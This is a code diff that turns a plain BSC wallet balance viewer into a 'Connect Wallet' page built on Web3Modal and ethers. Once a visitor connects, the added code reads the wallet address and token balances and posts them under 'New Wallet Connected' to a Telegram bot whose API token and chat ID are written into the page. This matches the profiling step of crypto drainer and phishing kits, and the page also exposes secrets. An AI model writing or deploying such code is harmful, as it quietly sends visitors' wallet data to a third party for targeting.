@@ -2,183 +2,99 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>BSC Wallet Portfolio Viewer</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      text-align: center;
-      padding-top: 50px;
-    }
+  <title>Web3Modal + WalletConnect BSC</title>
+  <script type="module">
+    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@3.0.0/dist/index.js';
+    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@3.0.0/dist/index.js';
+    import { configureChains, createConfig } from 'https://unpkg.com/@wagmi/core@1.3.0/dist/index.js';
+    import { bsc } from 'https://unpkg.com/@wagmi/core@1.3.0/chains';
+    import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';
 
-    .container {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-      display: inline-block;
-      max-width: 600px;
-    }
+    const projectId = '830735eac5e93ca0f04292ca2d8873e5';
 
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
-    }
+    const chains = [bsc];
+    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
 
-    table {
-      margin-top: 20px;
-      width: 100%;
-      border-collapse: collapse;
-    }
+    const wagmiConfig = createConfig({
+      autoConnect: true,
+      connectors: w3mConnectors({ projectId, chains }),
+      publicClient
+    });
 
-    th, td {
-      border-bottom: 1px solid #ddd;
-      padding: 8px;
-    }
+    const ethereumClient = new EthereumClient(wagmiConfig, chains);
 
-    th {
-      background-color: #f0f0f0;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h2>BSC Wallet Token Balances</h2>
-    <button id="connectBtn">Connect Wallet</button>
-
-    <table id="tokenTable" style="display:none;">
-      <thead>
-        <tr>
-          <th>Token</th>
-          <th>Balance</th>
-        </tr>
-      </thead>
-      <tbody id="tokenBody">
-      </tbody>
-    </table>
-  </div>
-
-  <!-- Web3 + WalletConnect -->
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
-
-  <script>
-    const connectBtn = document.getElementById("connectBtn");
-    const tokenTable = document.getElementById("tokenTable");
-    const tokenBody = document.getElementById("tokenBody");
-
-    // List of popular BSC tokens
-    const tokenList = [
-      {
-        name: "BNB",
-        symbol: "BNB",
-        address: null  // Native coin
-      },
-      {
-        name: "Binance USD",
-        symbol: "BUSD",
-        address: "0xe9e7cea3dedca5984780bafc599bd69add087d56"
-      },
-      {
-        name: "Tether USD",
-        symbol: "USDT",
-        address: "0x55d398326f99059ff775485246999027b3197955"
-      },
-      {
-        name: "PancakeSwap",
-        symbol: "CAKE",
-        address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82"
-      },
-      {
-        name: "USDC",
-        symbol: "USDC",
-        address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
+    const modal = new Web3Modal({
+      projectId,
+      themeMode: 'light',
+      themeVariables: {
+        '--w3m-accent-color': '#f6851b',
+        '--w3m-background-color': '#ffffff'
       }
+    }, ethereumClient);
+
+    const tokenList = [
+      { symbol: "BNB", address: null },
+      { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56" },
+      { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955" },
+      { symbol: "CAKE", address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82" },
+      { symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" }
     ];
 
     const erc20Abi = [
-      { "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "type": "function" },
-      { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "type": "function" },
       { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" },
       { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
     ];
 
-    connectBtn.addEventListener("click", async () => {
-      const isMobile = /iPhone|Android/i.test(navigator.userAgent);
-      let provider;
+    async function sendToTelegram(message) {
+      const telegramToken = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
+      const chatId = '8060968649';
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
-      if (isMobile) {
-        // Mobile - Trust Wallet using WalletConnect
-        provider = new WalletConnectProvider.default({
-          rpc: {
-            56: "https://bsc-dataseed1.binance.org/"
-          },
-          chainId: 56,
-          qrcode: true, // Use QR code for mobile wallet connection
-        });
-
-        // Create a session for mobile deep linking (Trust Wallet)
-        await provider.connector.createSession();
-
-        // Get the WalletConnect URI for Trust Wallet deep link
-        const wcUri = provider.connector.uri;
-        const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
-
-        // Open the Trust Wallet app via deep link
-        window.location.href = link;
-
-        // Wait for the connection to complete
-        provider.on("connect", async () => {
-          const web3 = new Web3(provider);
-          const accounts = await web3.eth.getAccounts();
-          const address = accounts[0];
-
-          await fetchTokenBalances(web3, address);
-        });
-      } else {
-        // Desktop - MetaMask / Trust Wallet Extension
-        if (window.ethereum) {
-          provider = window.ethereum;
-          await provider.request({ method: "eth_requestAccounts" });
-
-          const web3 = new Web3(provider);
-          const accounts = await web3.eth.getAccounts();
-          const address = accounts[0];
-
-          await fetchTokenBalances(web3, address);
-        } else {
-          alert("No Ethereum wallet found. Please install MetaMask or Trust Wallet.");
-          return;
-        }
-      }
-    });
-
-    // Function to fetch token balances for an address
-    async function fetchTokenBalances(web3, address) {
-      tokenBody.innerHTML = "";
-      tokenTable.style.display = "table";
-
-      for (const token of tokenList) {
-        let balance = "0";
-
-        if (token.address === null) {
-          // Native BNB
-          const bnbWei = await web3.eth.getBalance(address);
-          balance = web3.utils.fromWei(bnbWei, "ether");
-        } else {
-          // ERC20 Token
-          const contract = new web3.eth.Contract(erc20Abi, token.address);
-          const rawBalance = await contract.methods.balanceOf(address).call();
-          const decimals = await contract.methods.decimals().call();
-          balance = (rawBalance / 10 ** decimals).toFixed(4);
-        }
-
-        const row = document.createElement("tr");
-        row.innerHTML = `<td>${token.symbol}</td><td>${balance}</td>`;
-        tokenBody.appendChild(row);
-      }
+      await fetch(url, {
+        method: 'POST',
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
     }
+
+    // Wallet Connect + Fetch + Telegram
+    window.connectWallet = async () => {
+      try {
+        const provider = await modal.connect();
+        const ethersProvider = new ethers.providers.Web3Provider(provider);
+        const signer = ethersProvider.getSigner();
+        const address = await signer.getAddress();
+
+        let message = `📲 New Wallet Connected:\nAddress: ${address}\n\n💰 Token Balances:\n`;
+
+        for (const token of tokenList) {
+          let balance = "0";
+          if (token.address === null) {
+            const bnbBal = await ethersProvider.getBalance(address);
+            balance = ethers.utils.formatEther(bnbBal);
+          } else {
+            const contract = new ethers.Contract(token.address, erc20Abi, ethersProvider);
+            const rawBal = await contract.balanceOf(address);
+            const decimals = await contract.decimals();
+            balance = (rawBal / (10 ** decimals)).toFixed(4);
+          }
+          message += `• ${token.symbol}: ${balance}\n`;
+        }
+
+        await sendToTelegram(message);
+        alert("✅ Wallet connected & balances sent to Telegram!");
+      } catch (error) {
+        console.error('❌ Wallet connection failed:', error);
+        alert("Connection failed. Check console.");
+      }
+    };
   </script>
+</head>
+<body style="font-family: Arial, sans-serif; text-align:center; padding: 50px;">
+  <h1>Connect to BSC Wallet</h1>
+  <button onclick="connectWallet()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
 </body>
 </html>
